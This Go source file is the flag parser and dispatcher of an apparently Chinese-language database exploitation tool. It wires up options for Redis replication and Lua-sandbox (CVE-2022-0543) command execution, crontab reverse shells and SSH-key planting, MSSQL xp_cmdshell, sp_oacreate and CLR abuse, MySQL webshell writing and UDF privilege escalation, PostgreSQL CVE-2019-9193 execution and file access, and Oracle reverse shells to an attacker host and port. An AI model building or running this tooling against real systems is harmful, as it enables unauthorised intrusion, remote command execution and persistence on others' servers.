package pac

import (
	"database/sql"
	"flag"
	"fmt"
	"strings"
)

var (
	// 连接状态
	conn *sql.DB

	// redis
	Ruser string
	Rhost string
	Rport string
	Lhost string
	Lport string
	PWD   string

	dump_   bool
	import_ bool
	shell   bool
	crontab bool
	sshkey  bool
	lua     bool
	exec    bool

	console bool
	cli     bool
	del     bool

	Redis bool

	dll string
	CMD string

	DoCMD bool

	cmd string

	// mssql
	MSsql    bool
	isXP     bool
	isSP     bool
	isCLR    bool
	console2 bool
	logshell bool
	difshell bool
	path     string
	e        string

	// SSH
	SSH bool

	// Mysql
	Mysql            bool
	IntoOutFileShell bool
	LogShell         bool
	UDF              bool

	// Postgre
	Postgre     bool
	CVE20199193 bool
	file        string
	Read1       bool
	Read2       bool
	list        bool
	uploadPath  string
	Write       bool
	Webshell    string

	// Oracle
	Oracle                   bool
	sid                      string
	dbms_export_extension    bool
	dbms_xmlquery_newcontext bool
	Funcall                  bool
	reverse                  bool

	// Socks5代理
	Socks5Proxy string
	proxyAddr   = flag.String("socks5", "", "socks5代理")
)

func init() {
	flag.StringVar(&Rhost, "rhost", "", "目标 IP")
	flag.StringVar(&Rport, "rport", "6379", "目标端口")
	flag.StringVar(&Lhost, "lhost", "", "vps")
	flag.StringVar(&Lport, "lport", "", "监听端口")
	flag.StringVar(&PWD, "pwd", "", "数据库密码")
	flag.BoolVar(&cli, "cli", false, "连接数据库shell")
	flag.BoolVar(&DoCMD, "docmd", false, "出现该参数表示要执行单条命令")
	flag.StringVar(&cmd, "cmd", "", "执行单条命令")
	flag.BoolVar(&del, "del", false, "卸载命令执行函数")

	flag.BoolVar(&Redis, "redis", false, "存在该参数表示连接redis数据库")

	flag.BoolVar(&dump_, "dump", false, "导出 Redis 数据")
	flag.BoolVar(&import_, "import", false, "导入 Redis 数据")
	flag.BoolVar(&exec, "exec", false, "主从复制-命令执行")
	flag.BoolVar(&shell, "shell", false, "写 Webshell (需要知道物理路径)")
	flag.BoolVar(&crontab, "crontab", false, "Linux 定时任务反弹 Shell (适用于centos，ubuntu可能不行)")
	flag.BoolVar(&sshkey, "sshkey", false, "Linux写 SSH 公钥 (先生成ssh公钥)")
	flag.BoolVar(&lua, "lua", false, "Lua沙盒绕过命令执行 CVE-2022-0543")
	flag.BoolVar(&console, "console", false, "使用交互式 shell")

	flag.StringVar(&dll, "so", "exp.dll", "设置 exp.dll | exp.so")

	//mssql
	flag.BoolVar(&MSsql, "mssql", false, "存在该参数表示连接mssql数据库")
	//mssql xpcmdshell
	flag.BoolVar(&isXP, "isxp", false, "判断是否存在xp_cmdshell,存在则开启")
	//mssql sp_oacreate
	flag.BoolVar(&isSP, "issp", false, "判断是否存在sp_oacreate,存在则开启")
	// mssql CLR
	flag.BoolVar(&isCLR, "isclr", false, "开启clr")
	flag.BoolVar(&console2, "console2", false, "sp_oacreate使用exec直接回显")
	// getshell
	flag.BoolVar(&logshell, "logshell", false, "通过日志备份getshell")
	flag.BoolVar(&difshell, "difshell", false, "通过差异备份getshell")
	flag.StringVar(&path, "path", "", "网站物理路径")
	flag.StringVar(&e, "e", "", "webshell脚本类型")

	// SSH
	flag.BoolVar(&SSH, "ssh", false, "ssh连接")
	flag.StringVar(&Ruser, "ruser", "root", "目标主机用户名")

	// Mysql
	flag.BoolVar(&Mysql, "mysql", false, "Mysql数据库")
	flag.BoolVar(&IntoOutFileShell, "outfileshell", false, "通过into outfile写入webshell")
	flag.BoolVar(&LogShell, "generallog", false, "通过修改日志存储位置getshell")
	flag.BoolVar(&UDF, "udf", false, "udf提权")

	// postgre
	flag.BoolVar(&Postgre, "postgre", false, "Postgre数据库")
	flag.BoolVar(&CVE20199193, "CVE20199193", false, "CVE-2019-9193提权")
	flag.StringVar(&file, "file", "", "需要读取的文件名称")
	flag.BoolVar(&Read1, "read1", false, "创建数据表存储读取内容")
	flag.BoolVar(&Read2, "read2", false, "利用postgresql大对象来处理读文件")
	flag.BoolVar(&list, "list", false, "列目录")
	flag.BoolVar(&Write, "write", false, "上传文件")
	flag.StringVar(&uploadPath, "uploadpath", "", "Webshell上传的路径")

	// Oracle
	flag.BoolVar(&Oracle, "oracle", false, "选择oracle数据库")
	flag.StringVar(&sid, "sid", "", "Oracle数据库名")
	flag.BoolVar(&dbms_export_extension, "dee", false, "使用dbms_export_extension注入漏洞执行命令")
	flag.BoolVar(&reverse, "re", false, "使用dbms_export_extension注入漏洞反弹shell")
	flag.BoolVar(&dbms_xmlquery_newcontext, "dx", false, "使用dbms_xmlquery_newcontext执行命令(dbms_export_extension存在漏洞前提下)")
	flag.BoolVar(&Funcall, "fc", false, "使用dbms_java_test.funcall()反弹shell")

}

func Help() {
	flag.Parse()
	if Redis {
		err := RedisClient(PWD)
		if err != nil {
			if strings.Contains(err.Error(), "context deadline exceeded") {
				Info("Redis 连接超时")

			}
			if strings.Contains(err.Error(), "NOAUTH Authentication required.") {
				Info("Redis 需要密码认证")
			}
			if strings.Contains(err.Error(), "ERR invalid password") {
				Info("Redis 认证密码错误!")
			}
			return
		}
		switch {
		case exec:
			if Lhost == "" {
				Info("缺少Lhost参数")
			}
			if console {
				RedisSlave()
				loopCmd("exec")
			} else {
				RedisSlave()
				RunCmd(CMD)
				CloseSlave("exec")
			}
		case dump_:
			handle_export()
		case import_:
			handle_import()
		case cli:
			loopRedis()
		case shell:
			echo("getshell", "./shell.txt")
		case crontab:
			echo("crontab", "./crontab.txt")
		case sshkey:
			echo("ssh", "./ssh.txt")
		case lua:
			if console {
				loopCmd("lua")
			} else {
				if CMD == "" {
					Info("缺少 cmd 参数, 无法执行命令哦")
					return
				}
				RedisLua(CMD)
			}
		}
	} else if MSsql {
		err, conn := MssqlConnect(Rhost, Rport, PWD)
		if err != nil {
			Info("连接错误")
			Err(err)
		}
		switch {
		case cli:
			loopMssqlCMD(conn)
		// xp_cmdshell
		case isXP:
			if console {
				MssqlCMDConsole(conn)
			} else if DoCMD {
				MssqlCMDone(cmd, conn)
			} else {
				MssqlXpcmdshell(conn)
			}

			// sp_oacreate
		case isSP:
			if console {
				CMDconsole_Spoacreate(conn)
			} else if console2 {
				CMDconsole_Spoacreate_two(conn)
			} else if DoCMD {
				CMDone_Spoacreate(cmd, conn)
			} else {
				OpenSpoacreate(conn)
				//Getresult(table, conn)
			}

		// CLR
		case isCLR:
			if console {
				CMDconsole_CLR(conn)
			} else if DoCMD {
				CMDone_CLR(cmd, conn)
			} else if del {
				DeleteWarSQLKit(conn)
			} else {
				MssqlCLR(conn)
			}
			// getshell
		case logshell:
			// Webshell_choice(conn)
			Choice("1", conn, e)
		case difshell:
			Choice("2", conn, e)
		default:
			Info("无功能参数，默认输出")
		}
	} else if SSH {
		SSHConnect(Ruser, Rhost, PWD)
	} else if Mysql {
		err, conn := MysqlConnect(Ruser, Rhost, PWD, Rport)
		if err != nil {
			Info("连接错误")
			Err(err)
		}
		switch {
		case cli:
			loopMysqlCMD(conn)
		case shell:
			if IntoOutFileShell {
				Webshell_IntoOutFile(conn, path)
			} else if LogShell {
				Webshell_logshell(conn, path)
			}
		case UDF:
			UdfPrivilege(conn)
		}
	} else if Postgre {
		conn := postgre_connect(Rhost, Rport, Ruser, PWD)
		result, err := postgrecmd("select version();", conn)
		if err != nil {
			Err(err)
		}
		Info(fmt.Sprintf("数据库版本：%s", result[0]["version"]))
		postgreisdba(conn)
		switch {
		case cli:
			loopPostgreCMD(conn)
		case CVE20199193:
			if console {
				cve_2019_9193_console(conn)
			} else {
				cve_2019_9193_cmd(cmd, conn)
			}
		case Read1:
			if console {
				loopPostgreFileRead(conn)
			} else {
				PostgreFileRead(conn, file)
			}
		case Read2:
			if console {
				loopPostgreFileReadhex(conn)
			} else {
				PostgreFileReadhex(conn, file)
			}
		case list:
			if console {
				loopPostgreListDirectoy(conn)
			} else {
				PostgreListDirectoy(conn, file)
			}
		case Write:
			WriteFile(conn, uploadPath, e)
		}
	} else if Oracle {
		conn, err := OracleConnect(Ruser, PWD, Rhost, Rport, sid)
		if err != nil {
			Err(err)
		}
		switch {
		case cli:
			loopOracleCMD(conn)
		case dbms_export_extension:
			if console {
				OracleExportExtensionConsole(conn)
			} else if DoCMD {
				OracleExportExtensionCMD(cmd, conn)
			} else if reverse {
				OracleExportExtensionReverse(conn, Lhost, Lport)
			}
		case del:
			DropFucnction(conn)
		case dbms_xmlquery_newcontext:
			if console {
				OracleXMLQueryConsole(conn)
			} else if DoCMD {
				OracleXMLQueryCMD(cmd, conn)
			}
		case Funcall:
			OracleFuncCallReverse(conn, Lhost, Lport)
		}
	}
}
